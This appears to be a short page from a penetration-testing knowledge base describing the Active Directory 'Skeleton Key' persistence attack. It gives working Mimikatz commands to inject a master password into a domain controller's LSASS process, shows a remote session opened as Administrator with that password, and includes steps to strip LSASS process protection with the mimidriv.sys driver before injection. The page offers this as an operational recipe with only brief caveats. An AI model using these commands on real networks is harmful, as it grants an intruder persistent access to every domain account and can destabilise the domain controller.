# Skeleton Key

Skeleton key is a persistence technique where it is possible to inject malware to the Domain Controller LSASS process so that it allows access as any user with a single password.

Very Noisy

{% hint style="danger" %}
Can break DC so NOT recommended in actual assessments
{% endhint %}

## Important to know:

* Require Domain Admin privileges
* Skeleton Key is not persistent across reboots
* Skeleton Key is not opsec safe and is also known to cause issues with AD CS

## Inject a skeleton key

```powershell
# needs DA privs
# password would be "mimikatz"
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' 
```

## Access any machine

```powershell
Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
#password would be 'mimikatz' 
```

### LSASS running as a protected process

In case Lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC

```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

more detailed

{% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/persistence/skeleton-key-attack" %}
